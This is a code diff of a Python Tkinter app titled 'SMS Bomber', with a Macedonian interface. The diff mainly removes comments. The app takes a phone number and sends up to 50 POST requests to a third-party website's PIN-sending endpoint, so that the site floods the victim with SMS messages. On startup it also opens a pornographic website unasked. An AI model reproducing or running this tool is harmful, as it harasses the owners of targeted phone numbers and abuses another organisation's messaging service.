@@ -14,25 +14,24 @@ def open_website():
     webbrowser.open_new("xnxx.com")
 
 def send_sms(phone_number, num_messages):
-    url = 'http://sportalklub.mk/welcome/sendPIN'  # Updated URL for sending PIN
+    url = 'http://sportalklub.mk/welcome/sendPIN'
     data = {
         'nmb': phone_number,
         'sbm': ' ИСПРАТИ '
     }
 
-    start_time = time.time()  # Record start time
+    start_time = time.time()  
 
     try:
         for _ in range(num_messages):
             response = requests.post(url, data=data, allow_redirects=False)
             if response.status_code == 302 and '/welcome/confirmPIN' in response.headers.get('Location', ''):
                 print("Успешно бомбардирано :):", phone_number)
-                time.sleep(1)  # Sleep for 1 second between each request to avoid overwhelming the server
+                time.sleep(1)  
+        end_time = time.time()  
+        duration = end_time - start_time 
 
-        end_time = time.time()  # Record end time
-        duration = end_time - start_time  # Calculate duration
-
-        completed_label.config(text=f"Успешно бомбардирано! Времетраење: {duration:.2f} секунди")  # Update completed label with duration
+        completed_label.config(text=f"Успешно бомбардирано! Времетраење: {duration:.2f} секунди")  
     except requests.exceptions.RequestException as e:
         print("An error occurred while sending SMS to:", phone_number, "- Request Exception:", e)
     except Exception as e:
@@ -47,40 +46,40 @@ def send_sms_button_click():
         messagebox.showerror("Грешка!", "Ве молам внесете го бројот правилно..")
         return
 
-    num_messages = int(float(num_messages_scale.get()))  # Convert to float first to handle decimal values
-    num_messages = min(max(1, num_messages), 50)  # Restrict number of messages between 1 and 50
-    num_messages_scale.set(num_messages)  # Update scale widget if value is out of range
-    num_messages_label.config(text=f"Број на пораки (1-50): {num_messages}")  # Update label with current value
+    num_messages = int(float(num_messages_scale.get()))  
+    num_messages = min(max(1, num_messages), 50)  
+    num_messages_scale.set(num_messages)  
+    num_messages_label.config(text=f"Број на пораки (1-50): {num_messages}")  
     send_sms(phone_number, num_messages)
 
-# Create Tkinter window
+
 root = tk.Tk()
 root.title("СМС Бомбардер")
 
-# Open custom website upon running the app
+
 open_website()
 
-# Create phone number entry
+
 phone_label = ttk.Label(root, text="Внеси број:")
 phone_label.grid(row=0, column=0, padx=5, pady=5)
 phone_entry = ttk.Entry(root)
 phone_entry.grid(row=0, column=1, padx=5, pady=5)
 
-# Create scale for number of messages
+
 num_messages_label = ttk.Label(root, text="Број на пораки (1-50): 1")
 num_messages_label.grid(row=1, column=0, columnspan=2, padx=5, pady=5)
 num_messages_scale = ttk.Scale(root, from_=1, to=50, orient="horizontal", command=update_num_messages_label)
 num_messages_scale.grid(row=2, column=0, columnspan=2, padx=5, pady=5)
 
-# Create button to send SMS
+
 send_button = ttk.Button(root, text="Прати", command=send_sms_button_click)
 send_button.grid(row=3, column=0, columnspan=2, padx=5, pady=5)
 
-# Create label to display completion message
+
 completed_label = ttk.Label(root, text="")
 completed_label.grid(row=4, column=0, columnspan=2, padx=5, pady=5)
 
-# Create label to display author
+
 author_label = ttk.Label(root, text="Автор: Леонид Крстевски")
 author_label.grid(row=5, column=0, columnspan=2, padx=5, pady=5)
 
